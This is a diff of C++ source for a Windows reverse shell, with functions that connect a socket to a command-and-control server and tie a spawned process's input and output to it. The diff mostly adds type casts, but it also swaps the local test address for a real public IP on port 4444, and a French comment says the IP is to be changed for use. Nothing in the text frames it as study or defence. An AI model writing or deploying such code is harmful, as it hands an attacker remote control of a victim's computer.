@@ -16,7 +16,7 @@ void RunShell(char* C2Server, int C2Port) {
         addr.sin_addr.s_addr = inet_addr(C2Server);  
         addr.sin_port = htons(C2Port);    
 
-        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
+        if (WSAConnect(mySocket, reinterpret_cast<SOCKADDR*>(&addr), sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
             closesocket(mySocket);
             WSACleanup();
             continue;
@@ -38,7 +38,7 @@ void RunShell(char* C2Server, int C2Port) {
                 sinfo.cb = sizeof(sinfo);
                 sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                 sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
-                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
+                CreateProcess(NULL, reinterpret_cast<LPSTR>(Process), NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                 WaitForSingleObject(pinfo.hProcess, INFINITE);
                 CloseHandle(pinfo.hProcess);
                 CloseHandle(pinfo.hThread);
@@ -62,7 +62,7 @@ void startReverseShell(void) {
     /*
         Il faudra changer l'adresse IP en cas d'utilisation
     */
-    char host[] = "127.0.0.1";
+    char host[] = "82.64.37.252";
     int port = 4444;
     RunShell(host, port);
 }
